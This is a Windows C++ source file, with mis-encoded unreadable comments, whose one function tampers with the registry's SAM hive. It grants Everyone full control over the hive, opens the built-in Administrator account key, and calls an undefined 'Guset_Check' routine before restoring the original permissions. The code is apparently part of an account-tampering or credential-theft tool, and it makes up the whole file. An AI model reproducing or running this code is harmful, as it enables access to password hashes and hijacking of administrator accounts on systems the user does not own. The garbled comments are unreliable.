#include <windows.h>
#include <iostream> 
#include <Aclapi.h> 
using namespace std;
#pragma comment (lib,"Advapi32.lib") 
void Guset_Check();
void Change_SAM_Access()
{ 
    DWORD dwRet; 
    LPSTR SamName = "MACHINE\\SAM\\SAM"; 
    PSECURITY_DESCRIPTOR pSD = NULL; 
    PACL pOldDacl = NULL; 
    PACL pNewDacl = NULL; 
    EXPLICIT_ACCESS ea; 
    HKEY hKey = NULL; 

    // ��ȡSAM������DACL 
    dwRet = GetNamedSecurityInfo(SamName, SE_REGISTRY_KEY, DACL_SECURITY_INFORMATION, 
                NULL, NULL, &pOldDacl, NULL, &pSD); 
    if (dwRet != ERROR_SUCCESS) 
    { 
        printf("GetNamedSecurityInfo Error: %d\n", dwRet); 
        goto FreeAndExit; 
    } 

    // ����һ��ACE������Everyone��ȫ���ƶ��󣬲������Ӷ���̳д�Ȩ�� 
    ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS)); 
    BuildExplicitAccessWithName(&ea, "Everyone", KEY_ALL_ACCESS, SET_ACCESS, 
        SUB_CONTAINERS_AND_OBJECTS_INHERIT); 

    // ���µ�ACE����DACL 
    dwRet = SetEntriesInAcl(1, &ea, pOldDacl, &pNewDacl); 
    if (dwRet != ERROR_SUCCESS) 
    { 
        printf("SetEntriesInAcl Error: %d\n", dwRet); 
        goto FreeAndExit; 
    } 

    // ����SAM������DACL 
    dwRet = SetNamedSecurityInfo(SamName, SE_REGISTRY_KEY, DACL_SECURITY_INFORMATION, 
                NULL, NULL, pNewDacl, NULL); 
    if (dwRet != ERROR_SUCCESS) 
    { 
        printf("SetNamedSecurityInfo Error: %d\n", dwRet); 
        goto FreeAndExit; 
    } 

    // ��SAM���Ӽ� 
    dwRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users\\000001F4", 
                0, KEY_ALL_ACCESS, &hKey); 
    if (dwRet != ERROR_SUCCESS) 
    { 
        printf("RegOpenKeyEx Error: %d\n", dwRet); 
        goto FreeAndExit; 
    } 
	Guset_Check();

FreeAndExit: 
    if (hKey) RegCloseKey(hKey); 
    if (pNewDacl) LocalFree(pNewDacl); 
    // ��ԭSAM������DACL 
    if (pOldDacl) SetNamedSecurityInfo(SamName, SE_REGISTRY_KEY, DACL_SECURITY_INFORMATION, 
                        NULL, NULL, pOldDacl, NULL); 
    if (pSD) LocalFree(pSD); 
    return; 
}


